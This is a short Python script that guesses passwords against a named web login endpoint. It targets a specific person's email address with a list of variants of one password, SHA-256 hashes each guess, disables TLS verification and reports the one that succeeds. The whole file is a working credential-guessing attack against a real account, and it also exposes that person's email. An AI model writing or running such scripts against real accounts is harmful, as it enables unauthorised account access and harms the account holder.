
import requests
import hashlib
import urllib3
import json

urllib3.disable_warnings()

URL = "https://authentication.thinxview.com/api/auth/login/"

PASSWORDS = [
    "Aravind@123",
    "Aravind@1234",
    "Aravind@123 ",
    " Aravind@123",
    "Aravind@12345"
]

def check(pwd):
    h = hashlib.sha256(pwd.encode()).hexdigest()
    payload = {
        "email": "aravind.m@gndsolutions.in",
        "authMethod": "PASSWORD",
        "password": h,
        "remember_me": True
    }
    try:
        resp = requests.post(URL, json=payload, headers={"Content-Type": "application/json"}, verify=False, timeout=10)
        if resp.status_code == 200:
            print(f"FOUND:{pwd}")
            return True
    except:
        pass
    return False

if __name__ == "__main__":
    for p in PASSWORDS:
        if check(p):
            break
